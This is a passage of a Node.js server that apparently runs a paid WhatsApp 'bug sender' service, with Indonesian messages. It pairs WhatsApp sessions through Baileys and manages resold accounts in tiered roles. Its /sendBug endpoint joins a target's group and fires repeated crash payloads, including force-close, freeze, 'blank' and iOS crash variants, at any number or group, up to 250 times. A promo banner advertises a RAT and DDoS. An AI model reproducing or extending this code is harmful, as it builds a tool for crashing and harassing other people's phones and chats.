  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId, role };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId, role });
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://files.catbox.moe/pq7o5k.png",
    title: "PASAR ONLINE",
    desc: "BUY ACCES @dilzxxwkwk"
  },
    {
    image: "https://files.catbox.moe/23wrs6.png",
    title: "RAT ( BETA ) DAN DDOS",
    desc: "BAY TEAM"
  }
];

app.get("/getMyActivity", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const username = keyInfo.username;
  const userLogPath = path.join(LOGS_DIR, `${username}.json`);

  try {
    if (!fs.existsSync(userLogPath)) {
      return res.json({ valid: true, activities: [] });
    }

    const logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));

    logs.sort((a, b) => b.timestamp - a.timestamp);

    return res.json({ valid: true, activities: logs });
  } catch (err) {
    console.error("[GET LOGS ERROR]", err.message);
    return res.status(500).json({ valid: false, message: "Gagal mengambil log" });
  }
});

// ============================================================
// 🔥 ENDPOINT VALIDATE - LOGIN
// ============================================================

app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) return res.json({ valid: false });

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);

  if (existingSession) {
    const oldAndroid = existingSession.androidId;
    const newAndroid = androidId;

    if (oldAndroid !== newAndroid) {
      console.log(`LOGIN DITOLAK: ${username} | Device Lama: ${oldAndroid} | Device Baru: ${newAndroid}`);

      return res.json({
        valid: false,
        message: "Akun ini sedang login di perangkat lain. Silakan logout terlebih dahulu di perangkat lama."
      });
    }
  }

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  const userRole = user.role || "member_perhari";
  
  recordKey({
    username,
    key,
    role: userRole,
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  saveUserLog(
    username,
    "login",
    "Login Berhasil",
    `IP: ${req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip} | Device: ${androidId} | Role: ${userRole}`
  );

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: userRole,
    listBug: bugs,
    news
  });
});

// ============================================================
// 🔥 ENDPOINT MY INFO
// ============================================================

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  const userRole = user.role || "member_perhari";

  recordKey({
    username,
    key,
    role: userRole,
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: userRole,
    listBug: bugs,
    news: news
  });
});

// ============================================================
// 🔥 ENDPOINT CHANGE PASSWORD
// ============================================================

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

// ============================================================
// 🔥 ENDPOINT GET AVAILABLE ROLES (BARU)
// ============================================================

app.get("/getAvailableRoles", (req, res) => {
  const { key } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session key" });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.status(401).json({ valid: false, message: "User not found" });
  }
  
  const availableRoles = CAN_CREATE_ROLES[user.role] || [];
  const rolesWithDisplay = availableRoles.map(role => ({
    role: role,
    display: getRoleDisplay(role),
    color: getRoleColorHex(role),
    duration: getRoleDuration(role),
    level: getRoleLevel(role)
  }));
  
  res.json({
    valid: true,
    creatorRole: user.role,
    creatorDisplay: getRoleDisplay(user.role),
    availableRoles: rolesWithDisplay
  });
});

// ============================================================
// 🔥 ENDPOINT SEND BUG
// ============================================================

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  const senderMode = req.query.senderMode || 'private';

  const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
  const isGroupLink = groupRegex.test(target || '');
  const isGroupJid = typeof target === 'string' && target.endsWith('@g.us');

  if (!isGroupLink && !isGroupJid) {
    target = (target || "").replace(/\D/g, "");
  }

  console.log(`[target=${target} | bug=${bug} | mode=${senderMode}]`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  // Cek akses global sender
  if (senderMode === 'global') {
    if (!canAccessGlobalSender(user.role)) {
      return res.json({
        valid: false,
        message: "Role Anda tidak memiliki akses ke Global Sender."
      });
    }
  }

  // Cooldown berdasarkan role
  const cooldownSeconds = getCooldown(user.role);

  if (!user.lastSend) user.lastSend = 0;
  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);

  if (diffSeconds < cooldownSeconds) {
    return res.json({
      valid: true, 
      sended: false,
      cooldown: true, 
      wait: cooldownSeconds - diffSeconds,
    });
  }

  user.lastSend = now;
  saveDatabase(db);

  res.json({ valid: true, sended: true, cooldown: false, role: user.role });

  // Kirim bug di background
  setImmediate(async () => {
    saveUserLog(user.username, "bug",
      `Kirim Bug: ${bug.toUpperCase()}`,
      `Target: ${target} | Mode: ${senderMode} | Role: ${user.role}`
    );

    let sock = null;

    if (senderMode === 'global') {
      const entries = Object.entries(activeConnections);
      if (entries.length === 0) {
        console.warn(`[Global: tidak ada koneksi aktif.]`);
        return;
      }
      sock = entries[Math.floor(Math.random() * entries.length)][1];
      console.log(`[Global sender. Total aktif: ${entries.length}]`);
    } else {
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        console.warn(`[Private: tidak ada sock untuk ${user.username}.]`); 
        return;
      }
      console.log(`[Private: ${user.username}]`);
    }

    const attemptSend = async (sock, retry = false) => {
      let sessionName = null;
      try {
        for (const [k, v] of Object.entries(activeConnections)) {
          if (v === sock) { sessionName = k; break; }
        }

        let targetJid = "";

        if (isGroupLink) {
          const inviteCode = target.match(groupRegex)[1];
          console.log(`[Invite: ${inviteCode}]`);
          let groupInfo;
          try { groupInfo = await sock.groupGetInviteInfo(inviteCode); }
          catch (e) { throw new Error("Invite group invalid / expired"); }
          targetJid = groupInfo.id;
          try {
            await sock.groupAcceptInvite(inviteCode);
            console.log(`[Join group: ${targetJid}]`);
          } catch { console.log(`[Already joined]`); }
        } else if (isGroupJid) {
          targetJid = target;
        } else {
          targetJid = target.replace(/\D/g, "") + "@s.whatsapp.net";
        }

        console.log(`[JID: ${targetJid}]`);

        switch (bug) {
          case "resmension":
            for (let i = 0; i < 250; i++) { await resfcnoci(sock, targetJid); await sleep(2500); }
            break;
          case "fc":
            for (let i = 0; i < 100; i++) await GacorV1(sock, targetJid);
            await maklugueinjak(sock, targetJid);
            await sleep(2500);
            break;
          case "forceclosenoci":
            for (let i = 0; i < 50; i++) { await oxyfcnoci(sock, targetJid); await sleep(100); }
            break;
          case "android":
            for (let i = 0; i < 60; i++) await D3nss(sock, targetJid);
            break;
          case "androidfrz":
            for (let i = 0; i < 50; i++) await monkey(sock,targetJid);
            await Gren(sock,targetJid);
            await sleep(1000);
            break;
          case "clickcrash":
            for (let i = 0; i < 100; i++) await Buldozer(sock, targetJid);
            await sleep(3500);
            break;
          case "fcc":
            for (let i = 0; i < 100; i++) await ForcloseVnX(sock, targetJid); 
            await sleep(1500);
            break;
          case "ios":
            for (let i = 0; i < 60; i++) await pedrindhofcinvis(sock, targetJid);
            break;
          case "iosXv":
            for (let i = 0; i < 60; i++) await Gren(sock, targetJid);
            await sleep(1500);
            break;
          case "delay":
            for (let i = 0; i < 10; i++) await Monkey(sock, targetJid);
            await monkey(sock, targetJid);
            await Gren(sock, targetJid);
            await sleep(1500);
            break;
          case "blank":
            for (let i = 0; i < 100; i++) { await TheAnomoyusHardNew(sock, targetJid); await sleep(1000); }
            break;
          case "blankv2":
            for (let i = 0; i < 100; i++) { await Rena4YouBlankHard(sock, targetJid); await sleep(1000); }
            break;
          case "roid_group":
            for (let i = 0; i < 100; i++) {
              await docthumb(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "xfcui":
            for (let i = 0; i < 50; i++) await CrashNoClick(sock, targetJid);
            await sleep(1000);
            break;
          case "exec":
            for (let i = 0; i < 100; i++) { await exeTrash(sock, targetJid); await sleep(1000); }
            break;
          default:
            console.warn(`[Bug '${bug}' tidak dikenal]`);
        }

        console.log(`['${bug}' terkirim ke ${targetJid}]`);
        return true;

      } catch (err) {
        console.warn(`[${err.message}]`);
        if (sessionName && err.message === 'Connection Closed') {
          delete activeConnections[sessionName];
          console.log(`[Session ${sessionName} dihapus]`);
        }
        if (!retry) {
          const retrySock = await checkActiveSessionInFolder(user.username);
          if (retrySock) return await attemptSend(retrySock, true);
        }
        console.warn(`[Gagal kirim '${bug}' ke ${target}]`);
        return false;
      }
    };

    await attemptSend(sock);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

// ============================================================
// 🔥 ENDPOINT GET ACTIVE SENDERS (UPDATED)
// ============================================================

app.get("/getActiveSenders", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, senders: [] });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, senders: [] });

  // Cek akses global sender
  const canAccessGlobal = canAccessGlobalSender(user.role);
  
  if (!canAccessGlobal) {
    // Hanya tampilkan private sender user
    const privateSenders = getActiveCredsInFolder(user.username);
    return res.json({ 
      valid: true, 
      senders: privateSenders.map(s => s.sessionName),
      canAccessGlobal: false,
      role: user.role,
      roleDisplay: getRoleDisplay(user.role),
      roleLevel: getRoleLevel(user.role)
    });
  }

  // Tampilkan semua sender
  const senders = Object.keys(activeConnections);
  res.json({ 
    valid: true, 
    senders, 
    canAccessGlobal: true,
    role: user.role,
    roleDisplay: getRoleDisplay(user.role),
    roleLevel: getRoleLevel(user.role)
  });
});

// ============================================================
// 🔥 ENDPOINT GET SENDER STATS (UPDATED)
// ============================================================

app.get("/getSenderStats", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const username = user.username;
  const baseDir = 'permenmd';
  let privateCount = 0;
  let globalCount = 0;

  try {
    // Private sender
    const userPath = path.join(__dirname, baseDir, username);
    if (fs.existsSync(userPath)) {
      const files = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      files.forEach(f => {
        const sessionName = path.basename(f, ".json");
        if (activeConnections[sessionName]) privateCount++;
      });
    }

    // Global sender - hanya untuk role yang diizinkan
    const canAccessGlobal = canAccessGlobalSender(user.role);
    if (canAccessGlobal) {
      if (fs.existsSync(baseDir)) {
        const allUsers = fs.readdirSync(baseDir).filter(p => {
          const pPath = path.join(baseDir, p);
          return fs.lstatSync(pPath).isDirectory();
        });

        allUsers.forEach(u => {
          const uPath = path.join(baseDir, u);
          if (fs.existsSync(uPath)) {
            const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
            files.forEach(f => {
              const sessionName = path.basename(f, ".json");
              if (activeConnections[sessionName]) globalCount++;
            });
          }
        });
      }
    }

    res.json({
      valid: true,
      private: privateCount,
      global: globalCount,
      canAccessGlobal: canAccessGlobal,
      role: user.role,
      roleDisplay: getRoleDisplay(user.role),
      roleLevel: getRoleLevel(user.role),
      cooldown: getCooldown(user.role)
    });
  } catch (err) {
    console.error("[STATS ERROR]", err.message);
    res.status(500).json({ valid: false, error: "Server Error" });
  }
});

// ============================================================
// 🔥 ENDPOINT MY SENDER
// ============================================================

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  let conns = [];

  console.log(`[${user.username}] Request mySender`);
  conns = getActiveCredsInFolder(user.username);

  return res.json({
    valid: true,
    connections: conns
  });
});

const connectVipSessions = async () => {
  const vipPath = path.join(__dirname, 'vip');
  if (!fs.existsSync(vipPath)) {
    console.log(`[Folder vip/ tidak ditemukan, skip.]`);
    return;
  }

  sessions = fs.readdirSync(vipPath).filter(name =>
    fs.statSync(path.join(vipPath, name)).isDirectory()
);

  console.log(`[VIP sessions ditemukan: ${sessions.length}]`);

  await Promise.all(
    sessions.map(sessionName => {
      if (activeConnections[sessionName]) {
        console.log(`[VIP ${sessionName} sudah aktif, skip]`);
        return Promise.resolve();
      }
      return connectSession(vipPath, sessionName);
    })
  );

  console.log(`[Semua VIP session selesai diproses.]`);
};

// ============================================================
// 🔥 ENDPOINT GET PAIRING
// ============================================================

app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query
  const keyInfo = activeKeys[key]
  if (!keyInfo) return res.json({ valid: false })

  const db = loadDatabase()
  const user = db.find(u => u.username === keyInfo.username)
  if (!user) return res.status(401).json({ error: "Invalid session key" })
  if (!number) return res.status(400).json({ error: "Number is required" })

  try {
    const baseDir = path.join("permenmd", user.username)
    const sessionDir = path.join(baseDir, number)

    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true })
    }

    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir, { recursive: true })
    }

    fs.mkdirSync(sessionDir, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    })

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "close") {
        const isLoggedOut =
          lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut
        if (!isLoggedOut) {
          await waiting(3000)
          await pairingWa(number, user.username)
        } else {
          delete activeConnections[number]
        }
      }
    })

    if (!sock.authState.creds.registered) {
      await waiting(1200)
      const code = await sock.requestPairingCode(number, "ORCALELO")
      if (code) {
        return res.json({ valid: true, number, pairingCode: code })
      }
      return res.json({ valid: false })
    }

    return res.json({ valid: false })
  } catch (err) {
    return res.status(500).json({ error: err.message })
  }
})

// ============================================================
// 🔥 ENDPOINT CREATE ACCOUNT (MEMBER) - UPDATED
// ============================================================

app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day, role } = req.query;
  console.log(`[CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  // Role yang bisa create
  const allowedRoles = ['developers', 'ceo', 'owner', 'admin', 'tangan_kanan', 'vip', 'reseller'];
  if (!creator || !allowedRoles.includes(creator.role)) {
    console.log(`[CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  // Reseller limit
  const roleLimits = {
    developers: 999,
    ceo: 100,
    owner: 80,
    admin: 60,
    tangan_kanan: 40,
    vip: 30,
    reseller: 25
  };

  const currentLimit = roleLimits[creator.role] || 25;
  const currentMonth = new Date().toISOString().slice(0, 7);

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[CREATE] Limit akun bulan ${creator.role} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  // Reseller hanya bisa membuat max 30 hari
  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ 
      valid: true, 
      created: false, 
      invalidDay: true, 
      message: "Reseller can only create accounts up to 30 days." 
    });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  // 🔥 Gunakan role dari parameter
  let targetRole = role || 'member_perhari';

  // 🔥 Validasi role
  if (!isValidRole(targetRole)) {
    return res.json({
      valid: true,
      created: false,
      message: `Role '${targetRole}' tidak valid.`
    });
  }

  // 🔥 Cek izin create - TURUN TEMURUN
  if (!canCreateRole(creator.role, targetRole)) {
    return res.json({
      valid: true,
      authorized: false,
      message: `Role '${getRoleDisplay(creator.role)}' tidak bisa membuat '${getRoleDisplay(targetRole)}'.`
    });
  }

  // 🔥 Reseller hanya bisa buat 4 role tertentu
  if (creator.role === 'reseller') {
    const allowedResellerRoles = ['full_up', 'member_perbulan', 'member_perminggu', 'member_perhari'];
    if (!allowedResellerRoles.includes(targetRole)) {
      return res.json({
        valid: true,
        created: false,
        message: "Reseller hanya bisa membuat full_up, bulanan, mingguan, atau harian."
      });
    }
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: day === 'permanent' ? '2099-12-31' : expired.toISOString().split("T")[0],
    role: targetRole,
    createdBy: creator.username,
    createdAt: new Date().toISOString()
  };

  db.push(newAccount);
  creator.usageLog.count++;
  saveDatabase(db);

  saveUserLog(
    creator.username,
    "create",
    "Buat Akun Member",
    `User: ${newUser} | Durasi: ${day} Hari | Role: ${targetRole}`
  );

  console.log(`[CREATE] Akun berhasil dibuat: ${newAccount} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  const logLine = `${creator.username} Created ${newUser} duration ${day} role ${targetRole}\n`;
  appendLogAsync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

// ============================================================
// 🔥 ENDPOINT DELETE USER
// ============================================================

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const deleter = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!deleter) {
    return res.json({ valid: true, deleted: false, message: "Deleter not found." });
  }

  if (!targetUser) {
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const deleterLevel = getRoleLevel(deleter.role);
  const targetLevel = getRoleLevel(targetUser.role);

  // Cek izin hapus - harus lebih tinggi
  if (deleterLevel <= targetLevel) {
    return res.json({ 
      valid: true, 
      authorized: false, 
      message: `Cannot delete user with equal or higher rank.` 
    });
  }

  // Developers tidak bisa dihapus oleh siapapun (kecuali developers lain)
  if (targetUser.role === 'developers' && deleter.role !== 'developers') {
    return res.json({ 
      valid: true, 
      authorized: false, 
      message: "Only Developers can delete another Developer." 
    });
  }

  const index = db.findIndex(u => u.username === username);
  if (index !== -1) {
    const deletedUser = db[index];
    db.splice(index, 1);
    saveDatabase(db);

    const logLine = `${deleter.username} Deleted ${username}\n`;
    appendLogAsync('logUser.txt', logLine);
    
    console.log("[DELETE] User berhasil dihapus:", deletedUser);
    return res.json({ valid: true, deleted: true, user: deletedUser });
  }

  return res.json({ valid: true, deleted: false, message: "Failed to delete user." });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

// ============================================================
// 🔥 ENDPOINT LIST USERS
// ============================================================

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);

  if (!requester) {
    return res.json({ valid: true, authorized: false, message: "User not found." });
  }

  const requesterLevel = getRoleLevel(requester.role);
  
  // Role yang bisa melihat semua user
  const canSeeAll = ['developers', 'ceo', 'owner', 'admin', 'tangan_kanan', 'vip'];
  const canSeeAllUsers = canSeeAll.includes(requester.role);

  let users = [];
  
  if (canSeeAllUsers) {
    // Lihat semua user
    users = db.map(u => ({
      username: u.username,
      expiredDate: u.expiredDate,
      role: u.role || "member_perhari",
      parent: u.createdBy || "SYSTEM",
      roleDisplay: getRoleDisplay(u.role || "member_perhari"),
      roleLevel: getRoleLevel(u.role || "member_perhari")
    }));
  } else if (requester.role === 'reseller') {
    // Reseller hanya bisa melihat user yang dia buat + dirinya sendiri
    users = db
      .filter(u => u.createdBy === requester.username || u.username === requester.username)
      .map(u => ({
        username: u.username,
        expiredDate: u.expiredDate,
        role: u.role || "member_perhari",
        parent: u.createdBy || "SYSTEM",
        roleDisplay: getRoleDisplay(u.role || "member_perhari"),
        roleLevel: getRoleLevel(u.role || "member_perhari")
      }));
  } else {
    // Member hanya bisa melihat dirinya sendiri
    users = db
      .filter(u => u.username === requester.username)
      .map(u => ({
        username: u.username,
        expiredDate: u.expiredDate,
        role: u.role || "member_perhari",
        parent: u.createdBy || "SYSTEM",
        roleDisplay: getRoleDisplay(u.role || "member_perhari"),
        roleLevel: getRoleLevel(u.role || "member_perhari")
      }));
  }

  // Tambahkan info requester
  return res.json({ 
    valid: true, 
    authorized: true, 
    users,
    requester: {
      username: requester.username,
      role: requester.role,
      roleDisplay: getRoleDisplay(requester.role),
      roleLevel: getRoleLevel(requester.role)
    }
  });
});

// ============================================================
// 🔥 ENDPOINT USER ADD (CREATE ANY ROLE) - TURUN TEMURUN
// ============================================================

app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);
  const creatorRole = creator?.role || "member_perhari";
  const targetRole = role || "member_perhari";

  // Cek apakah role valid
  if (!isValidRole(targetRole)) {
    return res.json({ valid: true, created: false, message: `Role '${targetRole}' tidak valid.` });
  }

  // Cek izin create - TURUN TEMURUN
  if (!canCreateRole(creatorRole, targetRole)) {
    return res.json({ 
      valid: true, 
      authorized: false, 
      message: `Role '${getRoleDisplay(creatorRole)}' tidak bisa membuat '${getRoleDisplay(targetRole)}'.` 
    });
  }

  // Reseller hanya bisa membuat dengan durasi tertentu
  if (creatorRole === 'reseller') {
    const allowedResellerRoles = ['full_up', 'member_perbulan', 'member_perminggu', 'member_perhari'];
    if (!allowedResellerRoles.includes(targetRole)) {
      return res.json({ 
        valid: true, 
        created: false, 
        invalidDay: true, 
        message: "Reseller hanya bisa membuat full_up, bulanan, mingguan, atau harian." 
      });
    }
  }

  // VIP tidak bisa create
  if (creatorRole === 'vip') {
    return res.json({ 
      valid: true, 
      authorized: false, 
      message: "VIP tidak memiliki izin untuk membuat akun." 
    });
  }

  // Cek username sudah ada
  if (db.find(u => u.username === username)) {
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  // Hitung expired date
  let expiredDate;
  if (day === 'permanent' || targetRole === 'full_up') {
    expiredDate = '2099-12-31';
  } else {
    const expired = new Date();
    const days = parseInt(day) || 1;
    expired.setDate(expired.getDate() + days);
    expiredDate = expired.toISOString().split("T")[0];
  }

  const newUser = {
    username,
    password,
    role: targetRole,
    expiredDate: expiredDate,
    createdBy: creator.username,
    createdAt: new Date().toISOString()
  };

  db.push(newUser);
  saveDatabase(db);

  // Log aktivitas
  const logLine = `${creator.username} Created ${username} Role ${targetRole} Days ${day}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log(`[USERADD] User berhasil dibuat:`, newUser);

  return res.json({ 
    valid: true, 
    authorized: true, 
    created: true, 
    user: newUser 
  });
});

// ============================================================
// 🔥 ENDPOINT EDIT USER (EXTEND DURATION)
// ============================================================

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!editor) {
    return res.json({ valid: true, authorized: false, message: "Editor not found." });
  }

  if (!targetUser) {
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // Cek apakah editor bisa edit target - harus lebih tinggi
  const editorLevel = getRoleLevel(editor.role);
  const targetLevel = getRoleLevel(targetUser.role);
  
  if (editorLevel <= targetLevel) {
    return res.json({ 
      valid: true, 
      edited: false, 
      message: `Cannot edit user with equal or higher rank.` 
    });
  }

  // Reseller hanya bisa edit member (full_up, bulanan, mingguan, harian)
  if (editor.role === 'reseller') {
    const allowedEdit = ['full_up', 'member_perbulan', 'member_perminggu', 'member_perhari'];
    if (!allowedEdit.includes(targetUser.role)) {
      return res.json({ 
        valid: true, 
        edited: false, 
        message: "Reseller hanya bisa edit full_up, bulanan, mingguan, atau harian." 
      });
    }
    if (parseInt(addDays) > 30) {
      return res.json({ 
        valid: true, 
        edited: false, 
        invalidDay: true, 
        message: "Reseller hanya bisa menambah maksimal 30 hari." 
      });
    }
  }

  // Update expired date
  let newExpiredDate;
  if (addDays === 'permanent') {
    newExpiredDate = '2099-12-31';
  } else {
    const currentDate = new Date(targetUser.expiredDate);
    currentDate.setDate(currentDate.getDate() + parseInt(addDays));
    newExpiredDate = currentDate.toISOString().split("T")[0];
  }
  
  targetUser.expiredDate = newExpiredDate;

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser.username} Add Days ${addDays}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log("[EDIT] Masa aktif diperbarui:", targetUser);

  return res.json({ 
    valid: true, 
    authorized: true, 
    edited: true, 
    user: targetUser 
  });
});

app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  // Hanya Developers, CEO, Owner, Admin yang bisa melihat log
  const allowedRoles = ['developers', 'ceo', 'owner', 'admin'];
  if (!user || !allowedRoles.includes(user.role)) {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
